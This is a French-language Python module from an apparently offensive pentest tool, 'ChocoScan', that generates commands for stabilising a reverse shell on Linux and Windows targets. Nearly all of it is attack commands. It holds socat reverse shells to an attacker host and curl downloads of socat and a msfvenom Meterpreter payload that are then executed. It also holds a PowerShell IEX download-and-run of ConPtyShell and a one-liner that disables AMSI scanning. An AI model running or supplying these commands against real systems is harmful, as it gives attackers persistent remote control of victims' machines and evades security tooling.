"""
ChocoScan — Shell Upgrader.

Génère les commandes complètes pour upgrader un reverse shell
basique en shell interactif stable (avec historique, tab-completion,
Ctrl+C sans killer le shell, etc.).

Méthodes selon l'environnement :
  Linux  : python3 PTY → socat → script → stty raw
  Windows: rlwrap → ConPTY → PowerShell

Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations
from dataclasses import dataclass, field


@dataclass
class UpgradeStep:
    title:       str
    description: str
    on_target:   list[str]    # Commandes à exécuter sur la cible
    on_attacker: list[str]    # Commandes à exécuter côté attaquant
    notes:       list[str] = field(default_factory=list)
    requires:    str = ""     # Outil requis (python3, socat, etc.)


@dataclass
class UpgradeGuide:
    method:  str
    os:      str
    steps:   list[UpgradeStep]
    summary: str


def get_linux_upgrade_guides(lhost: str = "LHOST",
                              lport: int = 4445) -> list[UpgradeGuide]:
    """Génère tous les guides d'upgrade shell Linux."""
    guides = []

    # ── Méthode 1 : Python3 PTY + stty raw (la plus courante) ────────────────
    guides.append(UpgradeGuide(
        method="python3_pty",
        os="linux",
        summary="Python3 PTY — la plus rapide et la plus fiable. Fonctionne sur 95% des boxes Linux.",
        steps=[
            UpgradeStep(
                title="Étape 1 — Spawn PTY avec Python3",
                description="Crée un pseudo-terminal interactif depuis le shell basique.",
                on_target=[
                    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                    "# Si python3 absent :",
                    "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                    "# Ou avec script :",
                    "script /dev/null -c bash",
                ],
                on_attacker=[],
            ),
            UpgradeStep(
                title="Étape 2 — Background + stty raw",
                description="Passe le shell en background et configure stty pour un vrai terminal.",
                on_target=[
                    "# Appuyer sur : Ctrl + Z",
                ],
                on_attacker=[
                    "stty raw -echo; fg",
                    "# Le shell revient — taper (même si invisible) :",
                ],
                notes=["Après 'fg', le prompt peut sembler vide — c'est normal, tape 'reset'"],
            ),
            UpgradeStep(
                title="Étape 3 — Configurer le terminal",
                description="Exporte les variables TERM et les dimensions du terminal.",
                on_target=[
                    "reset",
                    "export SHELL=bash",
                    "export TERM=xterm-256color",
                    "# Obtenir les dimensions de TON terminal (côté attaquant) :",
                    "stty rows 50 columns 220",
                ],
                on_attacker=[
                    "# Pour connaître tes dimensions :",
                    "stty size   # affiche 'rows cols'",
                ],
                notes=[
                    "Adapter rows/columns aux dimensions réelles de ton terminal",
                    "Ctrl+C fonctionne maintenant sans killer le shell",
                    "Tab-completion et historique (flèches) sont actifs",
                ],
            ),
        ],
    ))

    # ── Méthode 2 : Socat (shell le plus propre) ──────────────────────────────
    guides.append(UpgradeGuide(
        method="socat",
        os="linux",
        summary="Socat — donne un PTY parfait si socat est disponible sur la cible ou transférable.",
        steps=[
            UpgradeStep(
                title="Côté attaquant — démarrer le listener socat",
                description="Socat configure automatiquement le terminal en mode raw.",
                on_target=[],
                on_attacker=[
                    f"socat file:`tty`,raw,echo=0 tcp-listen:{lport},reuseaddr",
                ],
                notes=["Lancer ce listener AVANT d'exécuter la commande sur la cible"],
            ),
            UpgradeStep(
                title="Côté cible — se connecter avec socat",
                description="Si socat est présent sur la cible, se connecter directement.",
                on_target=[
                    f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
                    "# Si socat absent, le transférer depuis le serveur HTTP :",
                    f"curl http://{lhost}/socat -o /tmp/socat && chmod +x /tmp/socat",
                    f"/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
                ],
                on_attacker=[
                    "# Héberger socat statique :",
                    f"python3 -m http.server 80  # dans le dossier contenant socat_static",
                ],
                requires="socat",
            ),
        ],
    ))

    # ── Méthode 3 : Script + stty (si python absent) ──────────────────────────
    guides.append(UpgradeGuide(
        method="script",
        os="linux",
        summary="Script — alternative si python3 et socat sont absents.",
        steps=[
            UpgradeStep(
                title="Upgrade avec la commande script",
                description="/usr/bin/script est présent sur quasi toutes les distributions.",
                on_target=[
                    "script /dev/null -c bash",
                    "# Puis :",
                    "# Ctrl + Z",
                ],
                on_attacker=[
                    "stty raw -echo; fg",
                ],
            ),
            UpgradeStep(
                title="Configurer le terminal",
                description="Mêmes étapes qu'avec python3.",
                on_target=[
                    "reset",
                    "export TERM=xterm-256color",
                    "stty rows 50 columns 220",
                ],
                on_attacker=[],
            ),
        ],
    ))

    # ── Méthode 4 : Upgrade vers Meterpreter ──────────────────────────────────
    guides.append(UpgradeGuide(
        method="meterpreter",
        os="linux",
        summary="Upgrade vers Meterpreter — le plus complet pour post-exploitation.",
        steps=[
            UpgradeStep(
                title="Depuis une session Meterpreter existante",
                description="Si tu as déjà une session Metasploit shell, l'upgrader.",
                on_target=[],
                on_attacker=[
                    "# Dans msfconsole, si tu as une session shell :",
                    "sessions -l",
                    "sessions -u <session_id>   # Upgrade vers Meterpreter",
                    "# Ou directement :",
                    "use post/multi/manage/shell_to_meterpreter",
                    "set SESSION <id>",
                    "run",
                ],
            ),
            UpgradeStep(
                title="Depuis un reverse shell basique — transfer + exec",
                description=f"Transférer un payload msfvenom depuis ton serveur HTTP.",
                on_target=[
                    f"curl http://{lhost}/shell.elf -o /tmp/shell.elf && chmod +x /tmp/shell.elf",
                    "/tmp/shell.elf &",
                ],
                on_attacker=[
                    f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf",
                    f"python3 -m http.server 80",
                    f"# Dans msfconsole :",
                    f"use multi/handler",
                    f"set payload linux/x64/meterpreter/reverse_tcp",
                    f"set LHOST {lhost} ; set LPORT {lport}",
                    "run",
                ],
            ),
        ],
    ))

    return guides


def get_windows_upgrade_guides(lhost: str = "LHOST",
                                lport: int = 4445) -> list[UpgradeGuide]:
    """Génère les guides d'upgrade shell Windows."""
    guides = []

    # ── rlwrap ────────────────────────────────────────────────────────────────
    guides.append(UpgradeGuide(
        method="rlwrap",
        os="windows",
        summary="rlwrap nc — ajoute historique et flèches au nc listener. Suffisant pour la plupart des cas.",
        steps=[
            UpgradeStep(
                title="Listener rlwrap",
                description="Remplace simplement nc par rlwrap nc dans ton listener.",
                on_target=[],
                on_attacker=[
                    f"rlwrap nc -lvnp {lport}",
                    "# Maintenant les flèches et l'historique fonctionnent",
                ],
            ),
        ],
    ))

    # ── ConPTY ────────────────────────────────────────────────────────────────
    guides.append(UpgradeGuide(
        method="conpty",
        os="windows",
        summary="Invoke-ConPtyShell — vrai PTY Windows interactif.",
        steps=[
            UpgradeStep(
                title="ConPtyShell — Windows PTY complet",
                description="Utilise ConPTY API pour un shell Windows vraiment interactif.",
                on_attacker=[
                    f"stty raw -echo; (stty size; cat) | nc -lvnp {lport}",
                ],
                on_target=[
                    f"IEX(IWR http://{lhost}/Invoke-ConPtyShell.ps1 -UseBasicParsing);",
                    f"Invoke-ConPtyShell {lhost} {lport}",
                ],
                notes=[
                    "Télécharger Invoke-ConPtyShell.ps1 depuis :",
                    "https://github.com/antonioCoco/ConPtyShell",
                ],
                requires="Invoke-ConPtyShell.ps1",
            ),
        ],
    ))

    # ── PowerShell upgrade ────────────────────────────────────────────────────
    guides.append(UpgradeGuide(
        method="powershell",
        os="windows",
        summary="Upgrade cmd.exe vers PowerShell pour plus de fonctionnalités.",
        steps=[
            UpgradeStep(
                title="Passer de cmd à PowerShell",
                description="Si tu es dans cmd.exe, passer à PowerShell est souvent plus puissant.",
                on_target=[
                    "powershell -ep bypass",
                    "# Vérifier le contexte :",
                    "$PSVersionTable",
                    "whoami; whoami /priv",
                    "# Désactiver AMSI (si nécessaire) :",
                    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
                ],
                on_attacker=[],
            ),
        ],
    ))

    return guides


def get_upgrade_guide(os_target: str = "linux", method: str = "python3_pty",
                       lhost: str = "LHOST", lport: int = 4445) -> UpgradeGuide | None:
    """Retourne un guide d'upgrade spécifique."""
    if os_target == "linux":
        guides = {g.method: g for g in get_linux_upgrade_guides(lhost, lport)}
    else:
        guides = {g.method: g for g in get_windows_upgrade_guides(lhost, lport)}
    return guides.get(method)


def get_quick_upgrade(os_target: str = "linux") -> str:
    """Retourne le one-liner d'upgrade le plus rapide."""
    if os_target == "linux":
        return (
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' ; "
            "# Ctrl+Z ; stty raw -echo; fg ; reset ; "
            "export TERM=xterm-256color SHELL=bash ; stty rows 50 columns 220"
        )
    return "rlwrap nc -lvnp 4444  # Remplacer nc par rlwrap nc dans le listener"
